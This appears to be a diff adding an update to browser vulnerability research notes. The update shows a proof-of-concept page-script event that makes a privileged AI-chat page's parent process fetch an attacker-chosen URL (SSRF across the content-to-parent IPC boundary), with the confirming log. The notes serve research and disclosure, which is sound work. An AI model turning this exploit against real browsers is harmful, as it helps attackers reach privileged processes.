@@ -40,3 +40,30 @@ Notes
   environment (capture-queue/gfx artifact), so no clean positive local-file disclosure was
   landed here. The SSRF primitive is confirmed; the local-file oracle remains plausible per the
   code path but is unproven in this run.
+
+============================================================
+UPDATE — FULL END-TO-END content->parent IPC confirmed
+============================================================
+Method: Marionette set_context("content"); navigate top-level to about:aichatcontent
+(loads standalone in the privilegedabout process, <ai-chat-content> present). Then, as
+ORDINARY PAGE SCRIPT (content principal, no chrome access, no user gesture), dispatch the
+real DOM event the child actor forwards to the parent:
+
+  const detail = { conversationId:"poc-e2e", messageId:"poc-e2e",
+    items:[{ url:"http://127.0.0.1:8899/ignored",
+             thumbnail:"http://127.0.0.1:8899/ipc-e2e-<ts>" }] };
+  target.dispatchEvent(new CustomEvent("AIChatContent:RequestAssets",
+                       { detail, bubbles:true, composed:true }));
+
+The actor registers RequestAssets with wantUntrusted:true, so this untrusted (page-script)
+event is delivered: AIChatContentChild.handleEvent -> sendAsyncMessage -> parent
+AIChatContentParent.#handleRequestAssets -> captureThumbnail(thumbnail).
+
+Dispatch result: {'dispatchedOn': 'ai-chat-content', 'url': 'about:aichatcontent', 'hasChatContent': True}
+Parent SSRF hit: GET /ipc-e2e-1788954754 from 127.0.0.1     <-- PARENT fetched attacker URL
+
+=> The complete content->parent boundary crossing via the real IPC path is confirmed on the
+   official ASAN build, triggered by content-scope script with no user interaction.
+   (Getting script into the privileged about:aichatcontent document still requires an
+   injection/UXSS in that page or a compromised content process; page script is not
+   normally attacker-controlled. Stated for honest severity scoping.)
